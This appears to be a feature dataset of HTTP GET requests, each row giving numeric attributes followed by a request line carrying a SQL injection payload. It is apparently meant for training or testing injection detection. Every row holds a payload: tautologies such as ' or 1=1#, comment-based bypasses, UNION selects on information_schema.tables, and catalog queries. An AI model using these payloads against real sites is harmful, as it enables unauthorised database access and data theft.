34,1,200,6523,7,11,8,1,1,GET ?id=' and 'one'='one– HTTP/1.1
34,1,200,5022,7,11,8,1,1,GET ?id=' and 'one'='one– HTTP/1.1
36,1,200,6627,7,14,5,2,1,GET login/?id=admin' or 1=1 HTTP/1.1
28,1,200,3373,7,4,7,1,1,GET ?id=' or '1′='1 HTTP/1.1
28,1,200,3661,7,4,7,1,1,GET ?id=' or '1′='1 HTTP/1.1
28,1,200,5248,7,4,7,1,1,GET ?id=' or '1′='1 HTTP/1.1
25,1,200,6595,7,4,5,1,0,GET ?id= or 1=1# HTTP/1.1
57,1,200,1012,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
43,1,200,6712,7,16,9,2,1,GET login/?id=admin'or 1=1 or ''=' HTTP/1.1
43,1,200,1506,7,16,9,2,1,GET login/?id=admin'or 1=1 or ''=' HTTP/1.1
26,1,200,4050,7,4,7,1,1,GET ?id=' or '' ' HTTP/1.1
26,1,200,1973,7,4,7,1,1,GET ?id=' or '' ' HTTP/1.1
26,1,200,7074,7,4,7,1,1,GET ?id=' or '' ' HTTP/1.1
38,1,200,7436,7,10,7,2,1,GET login/?id=1′) and '1′='1– HTTP/1.1
38,1,200,3496,7,10,7,2,1,GET login/?id=1′) and '1′='1– HTTP/1.1
38,1,200,6699,7,10,7,2,1,GET login/?id=1′) and '1′='1– HTTP/1.1
37,1,200,7350,7,14,6,2,1,GET login/?id=admin' or 1=1# HTTP/1.1
31,1,200,2737,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,2962,7,13,3,2,1,GET login/?id= or true HTTP/1.1
38,1,200,3845,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
35,1,200,1711,12,4,7,1,1,GET ?id=' or 1=1 LIMIT 1;# HTTP/1.1
24,1,200,6556,7,4,5,1,0,GET ?id=or 1=1# HTTP/1.1
24,1,200,2855,7,4,5,1,0,GET ?id=or 1=1# HTTP/1.1
40,1,200,3915,7,14,9,2,1,GET login/?id=admin') or '1'='1 HTTP/1.1
40,1,200,3609,7,14,9,2,1,GET login/?id=admin') or '1'='1 HTTP/1.1
20,1,200,5902,7,2,6,1,1,GET ?id='^' HTTP/1.1
19,1,200,2172,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,4669,7,2,5,1,1,GET ?id='# HTTP/1.1
31,1,200,5452,7,9,6,2,2,GET login/?id=or 1=1-- HTTP/1.1
67,1,200,2641,7,36,10,3,1,GET login/?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
25,1,200,6831,7,5,4,1,0,GET ?id= and 1=1 HTTP/1.1
34,1,200,2864,7,9,8,2,1,GET login/?id=' or '1'='1 HTTP/1.1
36,1,200,1543,7,9,10,2,1,GET ?id=admin' or '1'='1'/* HTTP/1.1
36,1,200,1534,7,9,10,2,1,GET ?id=admin' or '1'='1'/* HTTP/1.1
36,1,200,5223,7,9,10,2,1,GET ?id=admin' or '1'='1'/* HTTP/1.1
36,1,200,5475,7,9,10,2,1,GET ?id=admin' or '1'='1'/* HTTP/1.1
26,1,200,6068,7,4,8,1,1,GET ?id=' or ''^' HTTP/1.1
26,1,200,6267,7,4,8,1,1,GET ?id=' or ''^' HTTP/1.1
26,1,200,3863,7,4,8,1,1,GET ?id=' or ''^' HTTP/1.1
27,1,200,2010,7,4,5,1,1,GET ?id=' or 0=0 – HTTP/1.1
38,1,200,4133,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,1557,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
26,1,200,2573,7,8,5,1,1,GET ?id=or true-- HTTP/1.1
36,1,200,7905,7,9,10,2,1,GET login/?id=') or ('1'='1 HTTP/1.1
31,1,200,5551,7,9,6,1,1,GET ?id=admin' or 1=1# HTTP/1.1
36,1,200,1557,7,11,10,2,1,GET login/?id=') or ('x'='x HTTP/1.1
21,1,200,3859,7,2,6,1,1,GET ?id=' -- HTTP/1.1
30,1,200,1144,7,9,6,2,1,GET login/?id='or'1=1 HTTP/1.1
30,1,200,7211,7,9,6,2,1,GET login/?id='or'1=1 HTTP/1.1
27,1,200,2720,7,4,6,1,2,GET ?id= or 0=0 -- HTTP/1.1
27,1,200,4665,7,4,6,1,2,GET ?id= or 0=0 -- HTTP/1.1
46,1,200,7909,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,5904,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
20,1,200,7395,7,2,6,1,1,GET ?id='*' HTTP/1.1
32,1,200,3503,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,5992,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,5879,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
36,1,200,4757,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
32,1,200,5470,7,9,5,3,2,GET login/?id= or 1=1/* HTTP/1.1
33,1,200,1935,7,10,8,1,1,GET ?id=' or 'one'='one– HTTP/1.1
32,1,200,4246,7,11,5,2,1,GET login/?id=' or a=a– HTTP/1.1
32,1,200,3054,7,11,5,2,1,GET login/?id=' or a=a– HTTP/1.1
26,1,200,6116,7,4,6,1,1,GET ?id=' or 1=1# HTTP/1.1
26,1,200,6286,7,4,6,1,1,GET ?id=' or 1=1# HTTP/1.1
25,1,200,3612,7,4,5,1,1,GET ?id=' or 1=1 HTTP/1.1
25,1,200,3212,7,4,5,1,1,GET ?id=' or 1=1 HTTP/1.1
88,1,200,6481,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,5777,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,3065,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
32,1,200,5537,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
26,1,200,5528,7,7,6,2,1,GET login/?id='*' HTTP/1.1
26,1,200,2843,7,4,8,1,1,GET ?id=' or ''=' HTTP/1.1
27,1,200,6910,7,7,6,2,1,GET login/?id=' -- HTTP/1.1
38,1,200,6481,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
38,1,200,5859,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
26,1,200,7508,7,6,6,1,1,GET ?id= like '%' HTTP/1.1
26,1,200,7886,7,6,6,1,1,GET ?id= like '%' HTTP/1.1
26,1,200,3686,7,4,5,2,2,GET ?id= or 1=1/* HTTP/1.1
26,1,200,2679,7,7,5,2,1,GET login/?id=' ' HTTP/1.1
62,1,200,3560,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
39,1,200,5886,7,16,6,2,1,GET login/?id=' or uid like '% HTTP/1.1
29,1,200,1566,7,9,6,2,1,GET login/?id='="or' HTTP/1.1
20,1,200,2647,7,2,6,1,1,GET ?id='-' HTTP/1.1
20,1,200,6845,7,2,6,1,1,GET ?id='-' HTTP/1.1
30,1,200,2965,7,4,10,1,1,GET ?id=' or '1'='1'# HTTP/1.1
94,1,200,1765,17,55,7,2,1,GET login/?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
45,1,200,2923,7,14,8,2,1,GET login/?id=' or 1=1 limit 1 -- -  HTTP/1.1
33,1,200,1162,7,4,13,1,1,GET ?id=') or ('1'='1'-- HTTP/1.1
41,1,200,3531,7,18,6,2,1,GET login/?id=' or uname like '% HTTP/1.1
35,1,200,3755,7,9,7,2,1,GET login/?id=) or '1′='1– HTTP/1.1
38,1,200,3345,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
